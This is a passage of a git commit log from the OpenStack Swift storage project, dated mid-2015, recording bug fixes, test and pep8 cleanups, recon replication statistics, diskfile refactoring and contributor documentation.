Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit 207dd9b49d7d53a9faa4849af2c40bb875416fce
Author: Darrell Bishop <darrell@swiftstack.com>
Date: Thu Jul 30 14:32:08 2015 -0700
Fix regression in WSGI server SIGHUP behavior
The SIGHUP receipt used to pop us out of an os.wait() where now, it's in
a "green" wait() and Timeout() combo, some part of which eats the signal
receipt. This causes the while loop condition to never get checked and
SIGHUP no longer works as a server reload command.
The fix is to loop at least every 0.5 seconds, as a trade-off between
not busy-waiting and checking the "keep running" condition often enough
to feel responsive.
Change-Id: I95283b8b7cfc2998ab5813e0ad3ca1fa231696c8
Closes-Bug: #1479972
commit bcd00d9461603db1477c5f1e9f8dd6405a319eb9
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Jun 8 19:40:56 2015 +0100
Refactor diskfile
This patch mostly eliminates the duplicate code that was
deliberately left in place during EC review to avoid major
churn of the diskfile module prior to the kilo release.
This focuses on obvious de-duplication and shuffling code
between classes. It deliberately does not attempt to
hammer out every last piece of de-duplication where that
would introduce more complex changes - that can come later.
Code is moved from the module level and from ECDiskFile\*
classes into new BaseDiskFile\* classes.
Concrete classes for replication and EC policy retain their
existing names i.e. DiskFile[Manager|Writer|Reader|] and
ECDiskFile[Manager|Writer|Reader|] respectively.
Knock-on changes:
- fix bug whereby get\_hashes was ignoring self.reclaim\_age
and always using the default arg value.
- replication diskfile manager now deletes a tombstone that is older
than reclaim\_age even when there is a newer .meta file.
- replication diskfile manager will no longer raise an
AssertionError if only a .meta file is found during
hash\_cleanup\_listdir.
- fix stale test in test\_auditor.py: test\_with\_tombstone test
setup was convoluted (probably dates back to when object puts
did not clean up the object dir). Now that they do you have to
try harder to create a dir with a tombstone and a data file.
Change-Id: I963e0d0ae0d6569ad1de605034c529529cbb4f9a
commit 9cb7eb4a4b6cdab8a5f16b3dc800b39ab4068522
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 11:34:07 2015 +0200
Update hacking to 0.10.0
Replace the whitelist of flake8 checks (select) with a blacklist
(ignore). It makes possible to disable a single check, which was not
possible before. This new approach permits to enable new tests more
easily and see which checks are currently disabled.
Only new checks are disabled, this change doesn't run less checks than
before. Currently, many checks are disabled, but following changes will
fix these new warnings.
When the "select" option of flake8 is used in tox.ini, the "ignore"
option is ignored. It is not possible to use "select" and "ignore"
options at the same time. See the code in pep8 (flake8 is based on
pep8):
https://github.com/PyCQA/pep8/blob/d48eef071003952ed0f98445dc3dc6bc29618f9c/pep8.py#L1808
The purpose of flake8 is to enhance the coding style, but also to help
to detect common bugs. Blacklisting checks permits to detect new bugs
when upgrading the tools. For example, new checks were recently added to
help porting code to Python 3.
This change permits to use pbr 1.0 and newer which is required to
support Python 3. Previously, hacking 0.8.1 was used, but hacking 0.8 is
incompatible with pbr 1.0 and newer (hacking 0.8 requires pbr<1.0).
pbr 1.0 is required to use environment markers on requirements to
install dnspython on Python 2 and dnspython3 on Python 3.
Change-Id: I41d63b9467083d7606ad18aaa398ca7738b27fae
commit 389a97e3526df68121cecfaf1909343b5d381cbc
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed Jul 29 23:46:58 2015 +0200
Fix pep8 E warning for hacking 0.10
Fix pep8 warnings of the E category of hacking 0.10:
\* E113: unexpected indentation
\* E121: continuation line under-indented for hanging indent
\* E122: continuation line missing indentation or outdented
\* E123: closing bracket does not match indentation of opening bracket's
line
\* E126: continuation line over-indented for hanging indent
\* E251: unexpected spaces around keyword / parameter equals
Change-Id: I0b24eebdf1a37dc1b572b6c9a3d3d4832d050237
commit d719064e788ec5fa70305fadaa46affcb603a9bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:28:44 2015 +0200
Fix warning pep8 E128 warning of hacking 0.10
Fix the warning E128: "continuation line under-indented for visual
indent" of pep8.
Change-Id: Ie6c6ae341fe3d6281f2095c1d756d552fa5937f9
commit a0db56dcde83096708e6fe64ae9338098e0ba98a
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:16:06 2015 +0200
Fix pep8 E265 warning of hacking 0.10
Fix the warning E265 "block comment should start with '# '" added in pep
1.5.
Change-Id: Ib57282e958be9c7cddffc7bca34fbbf1d4c460fd
commit 345785837f1caa01fec5bca091c70481d7069bea
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jul 30 13:11:00 2015 +0800
Remove error\_suppression\_interval, error\_suppression\_limit options.
These two options is belong to proxy-server, not account-replicator.
Change-Id: Ie030ecffd213e56db32df77c69b847479d96308f
commit 5a7383313b1c555df5fd47050f7ee3810b5e31fc
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Tue Jul 28 19:15:25 2015 -0400
Swift documentation for first-time contributors.
In this change, there are proposed improvement to Swift documentation aimed at
first-time contributors. They include a simplification of the Getting
Started page and a new page with some basic instructions/commands that the
first-time contributor should know. In addition, it shows some common errors
that the first-time contributor may find when executing git rebase and
information on how to track your changes.
Change-Id: I704202955093736b2f3b4102a649690a0392c6b0
commit 5b5c8820024141bc6ae49d7646a92fb53667ea9b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Jul 29 12:36:35 2015 +0100
Remove unused code in swift/obj/server.py
keep\_cache was defined twice
Change-Id: I5f775f618669e3dabfc3bc54dd7bd2cd7f00b2f0
commit 0c27cb07caf1027cd9734e8bd34d9759da33e667
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Wed Jul 29 06:36:01 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: Ic30cb1dc8f12280a52cc1f07a1cf516397ed680e
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit 117b61976fbf14d8a0d2157256f9a3230421ee72
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Jul 22 15:40:55 2015 -0700
functests: use assertIn and assertNotIn
We have a bunch of assertions like
self.assertTrue(resp.status in (200, 204))
Sometimes we get smart about failure messages and have something like
self.assertTrue(resp.status in (200, 204), resp.status)
so we can see what the status was when it failed.
Since we don't have to support Python 2.6 any more, we can use
assertIn/assertNotIn and get nice failure messages for free.
Change-Id: I2d46c9969d41207a89e01017b4c2bc533c3d744f
commit 8fe8bee7e0c5c9d34d7a8e6ab090c8d65c5ca78e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 18:06:32 2015 +0530
test/(functional, probe): Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
